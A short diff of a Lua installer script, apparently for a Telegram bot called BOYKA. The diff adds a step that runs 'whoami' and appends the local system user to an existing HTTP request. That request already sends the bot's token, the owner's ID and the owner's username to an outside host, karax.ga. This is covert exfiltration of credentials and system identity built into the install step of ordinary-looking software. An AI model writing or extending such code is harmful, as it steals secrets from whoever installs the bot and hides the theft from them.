@@ -69,7 +69,8 @@ end
 create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
-https.request('http://karax.ga/boyka/?token='..token..'&id='..SUDO..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
+install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+https.request('http://karax.ga/boyka/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("BOYKA", "w")  
 file:write([[
